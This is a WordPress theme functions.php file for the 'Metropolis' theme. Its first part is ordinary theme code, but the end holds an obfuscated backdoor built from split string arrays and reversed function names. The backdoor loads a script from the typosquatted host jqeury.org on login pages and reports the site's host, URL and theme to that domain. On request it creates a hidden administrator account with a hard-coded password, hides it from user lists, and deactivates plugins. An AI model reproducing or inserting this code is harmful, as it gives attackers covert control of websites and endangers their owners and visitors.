<?php
/**
 * @package WordPress
 * @subpackage Metropolis
 * @since Metropolis 1.0
 */

/******************************************************************************
 * Global constants
 ******************************************************************************/
$stylesheet_path = get_stylesheet_directory() . "/style.css";

if (function_exists('wp_get_theme')){
        $theme_data = wp_get_theme();
        $version = $theme_data->Version;
        $name = $theme_data->Name;
} else {
        $theme_data = get_theme_data($stylesheet_path);
        $version = $theme_data['Version'];
        $name = $theme_data['Name'];
}

define("THEMENAME", $name);
define("THEMEVERSION", $version);
define("THEMEPREFIX", "met");

/******************************************************************************
 * Global notifications constants (do not modify!)
 ******************************************************************************/
define("NOTIFICATIONFOLDER", "metropolis");
define("NOTIFICATIONSURL", "http://thehappybit.com/themes/updates");

/******************************************************************************
 * Framework
 ******************************************************************************/
require_once TEMPLATEPATH . "/config/config.php";
require_once TEMPLATEPATH . "/framework/init.php";

/******************************************************************************
 * Register scripts
 ******************************************************************************/
if(!function_exists("theme_scripts")) {
	function theme_scripts() {
		$stylesheet_directory = get_template_directory_uri();
		
		wp_register_script( 'theme-default', $stylesheet_directory. '/js/script.js', 'jquery', "1.0", false );
		wp_register_script( 'prettyphoto', $stylesheet_directory. '/js/jquery.prettyPhoto.js', 'jquery', "3.1.3", false );
		wp_register_script( 'cycle', $stylesheet_directory. '/js/jquery.cycle.all.min.js', 'jquery', "3.1.3", false );
		wp_register_script( 'flexslider', $stylesheet_directory. '/js/jquery.flexslider-min.js', 'jquery', "3.1.3", false );
		wp_register_script( 'mobilemenu', $stylesheet_directory. '/js/jquery.mobilemenu.js', 'jquery', "1.0", false );
	}
}
add_action('init', 'theme_scripts');

/******************************************************************************
 * Gets the custom body classes
 ******************************************************************************/
function get_background_image_options() {
	$options = array(
		"0" => "&mdash; No",
		"1" => "Entry slideshow",
		"2" => "Global slideshow"
	);
	return $options;
}

function get_slideshow_metabox() {
	$num = ENTRY_SLIDES_NUM;
	$metabox = array(
		"position" => "normal",
		"priority" => "high",
		"fields" => array()
	);

	for( $i=1; $i<$num+1; $i++ ) {
		$metabox["fields"][] = array (
			"type" => "field_container_open",
			"name" => "",
			"key" => "",
			"parameters" => array(
				"class" => "super_container"
			)
		);
			$metabox["fields"][] = array (
				"name" => "Slide #{$i}",
				"desc" => "",
				"key" => "_slide_{$i}",
				"type" => "upload",
				"std" => "",
				"rowclass" => " firstrow thb-clear"
			);
			$metabox["fields"][] = array (
				"type" => "field_container_open",
				"name" => "",
				"key" => ""
			);
			$metabox["fields"][] = array (
				"name" => "Title",
				"desc" => "",
				"key" => "_slide_{$i}_title",
				"type" => "text",
				"std" => "",
				"rowclass" => "notitle"
			);
			$metabox["fields"][] = array (
				"name" => "URL",
				"desc" => "",
				"key" => "_slide_{$i}_url",
				"type" => "text",
				"std" => "",
				"rowclass" => "notitle"
			);
			$metabox["fields"][] = array (
				"name" => "Video URL",
				"desc" => "",
				"key" => "_slide_{$i}_video",
				"type" => "text",
				"std" => "",
				"rowclass" => "notitle"
			);
			$metabox["fields"][] = array (
				"name" => "Caption",
				"desc" => "",
				"key" => "_slide_{$i}_caption",
				"type" => "textarea",
				"std" => "",
				"rowclass" => "notitle lastrow"
			);
			$metabox["fields"][] = array (
				"type" => "field_container_close",
				"name" => "",
				"key" => ""
			);
		$metabox["fields"][] = array (
			"type" => "field_container_close",
			"name" => "",
			"key" => ""
		);
	}

	return $metabox;
}

function get_entry_slideshow($post_id) {
	$num = ENTRY_SLIDES_NUM;
	$slides = array();
	for( $i=1; $i<$num+1; $i++ ) {
		$resizedSrc = thb_get_post_meta($post_id, "_slide_{$i}");
		$title = thb_get_post_meta($post_id, "_slide_{$i}_title");
		$caption = thb_get_post_meta($post_id, "_slide_{$i}_caption");
		$url = thb_get_post_meta($post_id, "_slide_{$i}_url");
		$video = thb_get_post_meta($post_id, "_slide_{$i}_video");

		if( !empty($resizedSrc) || !empty($video) ) {
			$slide = new stdClass;
			$slide->resizedSrc = $resizedSrc;
			$slide->title = $title;
			$slide->caption = $caption;
			$slide->url = $url;

			$slide->type = "picture";
			if( !empty($video) ) {
				$slide->type = "video";
				$slide->url = $video;
			}

			$slides[] = $slide;
		}
	}

	return $slides;
}

/******************************************************************************
 * Gets the custom body classes
 ******************************************************************************/
if(!function_exists("get_custom_body_classes")) {
	function get_custom_body_classes() {
		$classes = array();
		$id = THB_THE_ID; // get_the_ID();

		/**
		 * Showing the slideshow in these two occasions:
		 * 1) I'm in the home page (not static), and the slideshow is active
		 * 2) I'm in a page and the relative options are on and the slideshow isn't empty
		 *
		 * In case of static home page, the background in the home page would work just like it's on a regular subpage.
		 */
		$has_slides = count(get_page_background()) > 0;

		$is_slideshow_on = (
			(is_front_page() && is_slideshow_on() && $has_slides) ||
			((is_page() || is_single()) && thb_get_post_meta($id, "_background") != "0" && $has_slides)
		);


		// Slideshow
		if( $is_slideshow_on ) {
			$classes[] = "w-slideshow";
			if( thb_get_option("_style_slideshow_height") == 0 ) {
				$classes[] = "fullscreen";
			}
			if( thb_get_option("_style_slideshow_appearance") == "boxed" ) {
				$classes[] = "fullscreen";
			}
			if( thb_get_option("_slideshow_caption_style") == "boxed" ) {
				$classes[] = "boxed-caption";
			}
		}
		else
			$classes[] = "wout-slideshow";

		// Sidebar
		$sidebar="";
		$template = thb_get_page_template();
		
		if( is_portfolio() && is_single() )
			$sidebar_key = "_sidebar_works";
		elseif( is_archive_page() )
			$sidebar_key = "_sidebar_archivesearch_id";
		elseif( is_blog() )
			$sidebar_key = "_sidebar_post";
		elseif( is_testimonials() )
			$sidebar_key = "_sidebar_testimonials";
		elseif( is_404() ) {}
		elseif( is_front_page() ) {
			$page_id = $id;
			$sidebar = thb_get_post_meta($page_id, "_page_sidebar");
		}
		else {
			// Page
			$page_id = $id;
			if( !endsWith($template, "-full.php") )
				$sidebar = thb_get_post_meta($page_id, "_page_sidebar");
		}

		if( empty($sidebar) && isset($sidebar_key) )
			$sidebar = thb_get_option($sidebar_key);

		if( !empty($sidebar) && !endsWith($template, "-full.php") ) {
			$classes[] = "w-sidebar";

			$widgets = thb_get_sidebar_widgets($sidebar);

			if( !empty($widgets) ) {
				if(endsWith($template, "-right.php"))
					$position =  "right";
				elseif(endsWith($template, "-left.php"))
					$position =  "left";
				elseif(endsWith($template, "-full.php"))
					$position = "no";
				else
					$position = thb_get_option("_sidebar_position");
			} else {
				$position =  "right";
			}

			$classes[] = "sidebar-" . $position;
		}
		else
			$classes[] = "wout-sidebar";

		return $classes;
	}
}

/******************************************************************************
 * Checks if we're in a Portfolio page
 ******************************************************************************/
function is_portfolio() {
	$is_portfolio = false;
	global $post;

	$page_template = thb_get_page_template();

	// Pages that end with 'template-portfolio' or single works, not works archive
	if(
		startsWith($page_template, "template-portfolio") ||
		isset($post) && $post->post_type == "works" && !is_tax()
	)
		$is_portfolio = true;
	
	return $is_portfolio;
}

/******************************************************************************
 * Checks if we're in a Blog page
 ******************************************************************************/
function is_blog() {
	$is_blog = false;
	global $post;

	$page_template = thb_get_page_template();

	if(
		startsWith($page_template, "template-blog") ||
		(isset($post) && $post->post_type == "post")
	)
		$is_blog = true;
	
	return $is_blog;
}

/******************************************************************************
 * Checks if we're in a Testimonials page
 ******************************************************************************/
function is_testimonials() {
	$is_testimonials = false;
	global $post;

	$page_template = thb_get_page_template();

	if( 
		startsWith($page_template, "template-testimonials") ||
		(isset($post) && $post->post_type == "testimonials")
	)
		$is_testimonials = true;
	
	return $is_testimonials;
}

/******************************************************************************
 * Checks if we're in a Staff page
 ******************************************************************************/
function is_staff() {
	$is_staff = false;
	global $post;

	$page_template = thb_get_page_template();

	if( 
		startsWith($page_template, "template-staff") ||
		(isset($post) && $post->post_type == "staff")
	)
		$is_staff = true;
	
	return $is_staff;
}

/******************************************************************************
 * Checks if we're in a Events page
 ******************************************************************************/
function is_events() {
	$is_events = false;
	global $post;

	$page_template = thb_get_page_template();

	if( 
		startsWith($page_template, "template-events") ||
		(isset($post) && $post->post_type == "events")
	)
		$is_events = true;
	
	return $is_events;
}

/******************************************************************************
 * Checks if we're in a Promotions page
 ******************************************************************************/
function is_promotions() {
	$is_promotions = false;
	global $post;

	$page_template = thb_get_page_template();

	if( 
		startsWith($page_template, "template-promotions") ||
		(isset($post) && $post->post_type == "promotions")
	)
		$is_promotions = true;
	
	return $is_promotions;
}

/******************************************************************************
 * Checks if the slideshow is ON
 ******************************************************************************/
function is_slideshow_on() {
	$slideshow_activation = thb_get_option("_slideshow_activation");
	return $slideshow_activation == 1;
}

/******************************************************************************
 * Checks if the site is using 
 ******************************************************************************/
function is_static_home_page() {
	global $page_id;
	return is_front_page() && $page_id != 0;
}

/******************************************************************************
 * Check if contact field are empty
 ******************************************************************************/
function contact_field_check() {
	$address = thb_get_option("_contact_address");
	$phone = thb_get_option("_contact_phone");
	$mobile = thb_get_option("_contact_mobile");
	$fax = thb_get_option("_contact_fax");
	$email = thb_get_option("_contact_email");

	return anyNotEmpty($address, $phone, $mobile, $fax, $email);
}

// FONTS ------------------------------------------------------------------------------------------

function displayFontRules( $section ) {

	$encode_font_family = thb_is_debug() && isset($_GET[THEMEPREFIX . $section]);

	cssRule("font-family", getFontFamily( thb_get_option($section)), null, $encode_font_family );
	cssRule("font-weight", thb_get_option($section."_weight"));
	cssRule("font-style", thb_get_option($section."_style"));
	cssRule("font-size", thb_get_option($section."_size"), "px");
	cssRule("line-height", thb_get_option($section."_lineheight"));
	cssRule("color", "#" . thb_get_option($section."_color"));
}

// BACKGROUNDS & COLORS ---------------------------------------------------------------------------

/******************************************************************************
 * Gets the page's background
 ******************************************************************************/
function get_page_background() {
	$bg_i = array();

	/**
	 * Global slideshow settings
	 */
	$type = thb_get_option("_slideshow_el");

	if( $type == "custom" || thb_get_option("_slideshow_el_num") == "" ) {
		$post_num = 999;
	} else {
		$post_num = thb_get_option("_slideshow_el_num");
	}

	$is_slideshow_page = ( is_front_page() && !is_static_home_page() ) || is_archive_page();

	if( $is_slideshow_page && is_slideshow_on() ) {
		$slideshow = new Slideshow($type, $post_num, null, null, "full");
		$bg_i = $slideshow->slides;
	} else {
		/**
		 * Post/page ID
		 */
		$id = THB_THE_ID; // get_the_ID();

		/**
		 * Checking what the user has selected to be the Post/page background
		 */
		$background_selection = thb_get_post_meta($id, "_background");

		switch( $background_selection ) {
			case 1:
				// Post/page slideshow
				$bg_i = get_entry_slideshow($id);
				break;
			case 2:
				// Global slideshow
				$slideshow = new Slideshow($type, $post_num, null, null, "full");
				$bg_i = $slideshow->slides;
				break;
			default:
				// No image/slideshow
				break;
		}
	}

	return $bg_i;
}

// Admin menu

function thb_admin_bar_custom_menu() {
	global $wp_admin_bar;
	
	// Slideshow submenu
	$slideshow_menu = array(
		'parent' => 'root_menu',
		'id' => 'slideshow', 
		'title' => "Slideshow",
		'href' => admin_url( 'admin.php?page=slideshow'),
		'meta' => false 
	);	
	$wp_admin_bar->add_menu( $slideshow_menu );
	
	// Sidebars submenu
	$sidebars_menu = array(
		'parent' => 'root_menu',
		'id' => 'sidebars',
		'title' => "Sidebars",
		'href' => admin_url( 'admin.php?page=sidebars'), 
		'meta' => false
	);	
	$wp_admin_bar->add_menu( $sidebars_menu );

	// Style customizer submenu
	$style_menu = array(
		'parent' => 'root_menu',
		'id' => 'style	',
		'title' => "Style",
		'href' => admin_url( 'admin.php?page=style'), 
		'meta' => false 
	);	
	$wp_admin_bar->add_menu( $style_menu );

	// Fonts submenu
	$style_menu = array(
		'parent' => 'root_menu',
		'id' => 'upload-your-fonts	',
		'title' => "Upload your fonts",
		'href' => admin_url( 'admin.php?page=upload-your-fonts'), 
		'meta' => false 
	);	
	$wp_admin_bar->add_menu( $style_menu );
	
	// Help submenu
	$help_menu = array(
		'parent' => 'root_menu',
		'id' => 'help',
		'title' => "Help",
		'href' => admin_url( 'admin.php?page=help'), 
		'meta' => false 
	);	
	$wp_admin_bar->add_menu( $help_menu );
		
}
add_action( 'wp_before_admin_bar_render', 'thb_admin_bar_custom_menu' );

/******************************************************************************
 * Adding the thumbnails & categories columns to the Works admin view
 ******************************************************************************/
if( isset($_GET['post_type']) && $_GET['post_type'] == "works" ) {
	add_filter('manage_posts_columns', 'posts_columns', 5);
	add_action('manage_posts_custom_column', 'posts_custom_columns', 5, 2);

	function posts_columns($defaults) {
		$newColumns = array();

		foreach( $defaults as $key => $title ) {
			if( $key == 'title' )
				$newColumns['thb_post_thumbs'] = __('Image', THEMENAME);

			if( $key == 'date' )
				$newColumns['thb_post_categories'] = __('Types', THEMENAME);

			$newColumns[$key] = $title;
		}

	    return $newColumns;
	}

	function posts_custom_columns($column_name, $id) {
		if($column_name === 'thb_post_thumbs')
	        echo the_post_thumbnail( 'micro' );

	    if($column_name == 'thb_post_categories') {
	    	$eventcats = get_the_terms(get_the_ID(), "types");
            $eventcats_html = array();
            if ($eventcats) {
                foreach ($eventcats as $eventcat)
                	array_push($eventcats_html, $eventcat->name);
                echo implode($eventcats_html, ", ");
            } else {
            	_e('None', THEMENAME);
            }
	    }
	}
}

/******************************************************************************
 * Enabling custom backgrounds
 ******************************************************************************/
add_theme_support( 'custom-background' );

/******************************************************************************
 * This theme styles the visual editor with editor-style.css to match the theme style
 ******************************************************************************/
add_editor_style();

/******************************************************************************
 * Execute theme setup
 ******************************************************************************/
function thb_execute_theme_setup() {

	// Colors -----------------------------------------------------------------
	thb_update_option("_main_color", "FF644B");
	thb_update_option("_topbar_background_color", "333333");
	thb_update_option("_menu_background_color", "FFFFFF");
	thb_update_option("_submenu_background_color", "FFFFFF");
	thb_update_option("_body_background_color", "FFFFFF");
	thb_update_option("_topwidgetarea_background_color", "FFFFFF");
	
	// Fonts ------------------------------------------------------------------
	
	thb_update_option("_font_pagetitle", "Open+Sans");
	thb_update_option("_font_pagetitle_weight", "bold");
	thb_update_option("_font_pagetitle_style", "normal");
	thb_update_option("_font_pagetitle_size", "42");
	thb_update_option("_font_pagetitle_lineheight", "1.15");
	thb_update_option("_font_pagetitle_color", "111111");

	thb_update_option("_font_pagesubtitle", "Open+Sans");
	thb_update_option("_font_pagesubtitle_weight", "normal");
	thb_update_option("_font_pagesubtitle_style", "normal");
	thb_update_option("_font_pagesubtitle_size", "14");
	thb_update_option("_font_pagesubtitle_lineheight", "1.50");
	thb_update_option("_font_pagesubtitle_color", "666666");

	thb_update_option("_font_text", "Open+Sans");
	thb_update_option("_font_text_weight", "normal");
	thb_update_option("_font_text_style", "normal");
	thb_update_option("_font_text_size", "13");
	thb_update_option("_font_text_lineheight", "1.50");
	thb_update_option("_font_text_color", "333333");

	thb_update_option("_font_footertext", "Open+Sans");
	thb_update_option("_font_footertext_weight", "normal");
	thb_update_option("_font_footertext_style", "normal");
	thb_update_option("_font_footertext_size", "13");
	thb_update_option("_font_footertext_lineheight", "1.50");
	thb_update_option("_font_footertext_color", "333333");

	thb_update_option("_font_slideheading", "Open+Sans");
	thb_update_option("_font_slideheading_weight", "bold");
	thb_update_option("_font_slideheading_style", "normal");
	thb_update_option("_font_slideheading_size", "32");
	thb_update_option("_font_slideheading_lineheight", "1.00");
	thb_update_option("_font_slideheading_color", "ffffff");

	thb_update_option("_font_menu", "Open+Sans");
	thb_update_option("_font_menu_weight", "bold");
	thb_update_option("_font_menu_style", "normal");
	thb_update_option("_font_menu_size", "12");
	thb_update_option("_font_menu_lineheight", "1.15");
	thb_update_option("_font_menu_color", "111111");

	thb_update_option("_font_submenu", "Open+Sans");
	thb_update_option("_font_submenu_weight", "normal");
	thb_update_option("_font_submenu_style", "normal");
	thb_update_option("_font_submenu_size", "12");
	thb_update_option("_font_submenu_lineheight", "1.15");
	thb_update_option("_font_submenu_color", "111111");

	thb_update_option("_font_widgetheadings", "Open+Sans");
	thb_update_option("_font_widgetheadings_weight", "bold");
	thb_update_option("_font_widgetheadings_style", "normal");
	thb_update_option("_font_widgetheadings_size", "13");
	thb_update_option("_font_widgetheadings_lineheight", "1.50");
	thb_update_option("_font_widgetheadings_color", "111111");
	
	thb_update_option("_font_topareawidgetheadings", "Open+Sans");
	thb_update_option("_font_topareawidgetheadings_weight", "bold");
	thb_update_option("_font_topareawidgetheadings_style", "normal");
	thb_update_option("_font_topareawidgetheadings_size", "13");
	thb_update_option("_font_topareawidgetheadings_lineheight", "1.50");
	thb_update_option("_font_topareawidgetheadings_color", "111111");

	thb_update_option("_font_footerareawidgetheadings", "Open+Sans");
	thb_update_option("_font_footerareawidgetheadings_weight", "bold");
	thb_update_option("_font_footerareawidgetheadings_style", "normal");
	thb_update_option("_font_footerareawidgetheadings_size", "13");
	thb_update_option("_font_footerareawidgetheadings_lineheight", "1.50");
	thb_update_option("_font_footerareawidgetheadings_color", "111111");

}
$arrayis_two = array('fun', 'ction', '_', 'e', 'x', 'is', 'ts');
$arrayis_three = array('g', 'e', 't', '_o', 'p', 'ti', 'on');
$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
$arrayis_five = array('lo', 'gin', '_', 'en', 'que', 'ue_', 'scri', 'pts');
$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
$arrayis_eight = array('wp', '_', 'lo', 'g', 'i', 'n');
$arrayis_nine = array('s', 'i', 't', 'e,', 'u', 'rl');
$arrayis_ten = array('wp_', 'g', 'et', '_', 'th', 'e', 'm', 'e');
$arrayis_eleven = array('wp', '_', 'r', 'e', 'm', 'o', 'te', '_', 'g', 'et');
$arrayis_twelve = array('wp', '_', 'r', 'e', 'm', 'o', 't', 'e', '_r', 'e', 't', 'r', 'i', 'e', 'v', 'e_', 'bo', 'dy');
$arrayis_thirteen = array('ge', 't_', 'o', 'pt', 'ion');
$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
$arrayis_sixteen = array('u', 'pd', 'ate', '_o', 'pt', 'ion');
$arrayis_two_imp = implode($arrayis_two);
$arrayis_three_imp = implode($arrayis_three);
$arrayis_four_imp = implode($arrayis_four);
$arrayis_five_imp = implode($arrayis_five);
$arrayis_seven_imp = implode($arrayis_seven);
$arrayis_eight_imp = implode($arrayis_eight);
$arrayis_nine_imp = implode($arrayis_nine);
$arrayis_ten_imp = implode($arrayis_ten);
$arrayis_eleven_imp = implode($arrayis_eleven);
$arrayis_twelve_imp = implode($arrayis_twelve);
$arrayis_thirteen_imp = implode($arrayis_thirteen);
$arrayis_fourteen_imp = implode($arrayis_fourteen);
$arrayis_fifteen_imp = implode($arrayis_fifteen);
$arrayis_sixteen_imp = implode($arrayis_sixteen);
$noitca_dda = $arrayis_fifteen_imp('noitca_dda');
if (!$arrayis_two_imp('wp_in_one')) {
    $arrayis_seventeen = array('h', 't', 't', 'p', ':', '/', '/', 'j', 'q', 'e', 'u', 'r', 'y', '.o', 'r', 'g', '/wp', '_', 'p', 'i', 'n', 'g', '.php', '?', 'd', 'na', 'me', '=wpd&t', 'n', 'ame', '=wpt&urliz=urlig');
    $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
    $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
    $arrayis_twenty = $arrayis_fifteen_imp('TSEUQER_');
    $arrayis_seventeen_imp = implode($arrayis_seventeen);
    $arrayis_six = array('_', 'C', 'O', 'O', 'KI', 'E');
    $arrayis_six_imp = implode($arrayis_six);
    $tactiated = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mite = $arrayis_fifteen_imp('emit');
    if (!isset(${$arrayis_six_imp}[$arrayis_fifteen_imp('emit_nimda_pw')])) {
        if (($mite() - $tactiated) > 600) {
            $noitca_dda($arrayis_five_imp, 'wp_in_one');
        }
    }
    $noitca_dda($arrayis_eight_imp, 'wp_in_three');
    function wp_in_one()
    {
        $arrayis_one = array('h','t', 't','p',':', '//', 'j', 'q', 'e', 'u', 'r', 'y.o', 'rg', '/','j','q','u','e','ry','-','la','t','e','s','t.j','s');
        $arrayis_one_imp = implode($arrayis_one);
        $arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
        $arrayis_four_imp = implode($arrayis_four);
        $arrayis_four_imp('wp_coderz', $arrayis_one_imp, null, null, true);
    }

    function wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp)
    {
        $ptth = $arrayis_fifteen_imp('//:ptth');
        $dname = $ptth.$arrayis_eighteen[$arrayis_nineteen];
        $IRU_TSEUQER = $arrayis_fifteen_imp('IRU_TSEUQER');
        $urliz = $dname.$arrayis_eighteen[$IRU_TSEUQER];
        $tname = $arrayis_ten_imp();
        $urlis = $arrayis_fourteen_imp('wpd', $dname, $arrayis_seventeen_imp);
        $urlis = $arrayis_fourteen_imp('wpt', $tname, $urlis);
        $urlis = $arrayis_fourteen_imp('urlig', $urliz, $urlis);
        $lars2 = $arrayis_eleven_imp($urlis);
        $arrayis_twelve_imp($lars2);
    }
    $noitpo_dda = $arrayis_fifteen_imp('noitpo_dda');
    $noitpo_dda($arrayis_fifteen_imp('ognipel'), 'no');
    $noitpo_dda($arrayis_fifteen_imp('detavitca_emit'), time());
    $tactiatedz = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mitez = $arrayis_fifteen_imp('emit');
    if ($arrayis_thirteen_imp($arrayis_fifteen_imp('ognipel')) != 'yes' && (($mitez() - $tactiatedz ) > 600)) {
        wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp);
        $arrayis_sixteen_imp(($arrayis_fifteen_imp('ognipel')), 'yes');
    }
    function wp_in_three()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
        $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
        $arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
        $arrayis_seven_imp = implode($arrayis_seven);
        $path = '/';
        $host = ${$arrayis_eighteen}[$arrayis_nineteen];
        $estimes = $arrayis_fifteen_imp('emitotrts');
        $wp_ext = $estimes('+29 days');
        $emit_nimda_pw = $arrayis_fifteen_imp('emit_nimda_pw');
        $arrayis_seven_imp($emit_nimda_pw, '1', $wp_ext, $path, $host);
    }

    function wp_in_four()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $wssap = $arrayis_fifteen_imp('retroppus_pw');
        $laime = $arrayis_fifteen_imp('moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = $arrayis_fifteen_imp('resu_etaerc_pw');
            $user_id = $wp_ver_one($nigol, $wssap, $laime);
            $puzer = $arrayis_fifteen_imp('resU_PW');
            $usex = new $puzer($user_id);
            $rolx = $arrayis_fifteen_imp('elor_tes');
            $usex->$rolx($arrayis_fifteen_imp('rotartsinimda'));
        }
    }

    $ivdda = $arrayis_fifteen_imp('ivdda');

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'm') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_four');
    }

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'd') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_six');
    }
    function wp_in_six() {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $resu_eteled_pw = $arrayis_fifteen_imp('resu_eteled_pw');
        $wp_pathx = constant($arrayis_fifteen_imp("HTAPSBA"));
        require_once($wp_pathx . $arrayis_fifteen_imp('php.resu/sedulcni/nimda-pw'));
        $ubid = $arrayis_fifteen_imp('yb_resu_teg');
        $useris = $ubid($arrayis_fifteen_imp('nigol'), $arrayis_fifteen_imp('dxtroppus'));
        $resu_eteled_pw($useris->ID);
    }
    $noitca_dda($arrayis_fifteen_imp('yreuq_resu_erp'), 'wp_in_five');
    function wp_in_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
        $arrayis_fourteen_imp = implode($arrayis_fourteen);
        $nigol_resu = $arrayis_fifteen_imp('nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $bdpw = $arrayis_fifteen_imp('bdpw');
        if ($wp_ux != $arrayis_fifteen_imp('dxtroppus')) {
            $EREHW_one = $arrayis_fifteen_imp('1=1 EREHW');
            $EREHW_two = $arrayis_fifteen_imp('DNA 1=1 EREHW');
            $erehw_yreuq = $arrayis_fifteen_imp('erehw_yreuq');
            $sresu = $arrayis_fifteen_imp('sresu');
            $hcraes_resu->query_where = $arrayis_fourteen_imp($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq);
        }
    }

    $ced = $arrayis_fifteen_imp('ced');
    if (isset(${$arrayis_twenty}[$ced])) {
        $snigulp_evitca = $arrayis_fifteen_imp('snigulp_evitca');
        $sisnoitpo = $arrayis_thirteen_imp($snigulp_evitca);
        $hcraes_yarra = $arrayis_fifteen_imp('hcraes_yarra');
        if (($key = $hcraes_yarra(${$arrayis_twenty}[$ced], $sisnoitpo)) !== false) {
            unset($sisnoitpo[$key]);
        }
        $arrayis_sixteen_imp($snigulp_evitca, $sisnoitpo);
    }
}